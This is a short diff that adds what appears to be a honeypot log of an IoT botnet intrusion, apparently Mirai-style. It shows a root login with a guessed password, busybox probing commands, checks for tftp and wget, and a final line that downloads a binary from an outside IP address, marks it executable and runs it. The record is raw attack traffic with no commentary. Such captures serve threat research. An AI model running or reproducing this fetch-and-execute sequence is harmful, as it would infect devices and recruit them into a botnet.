@@ -1,0 +1,12 @@
+from: 168.232.15.12:53014 user:root password:hunt5759
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox ZFXNF
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox ZFXNF
+tftp; wget; /bin/busybox ZFXNF
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox ZFXNF
+rm .s; wget http://104.61.86.37:43641/.i; chmod 777 .i; ./.i; exit
+q
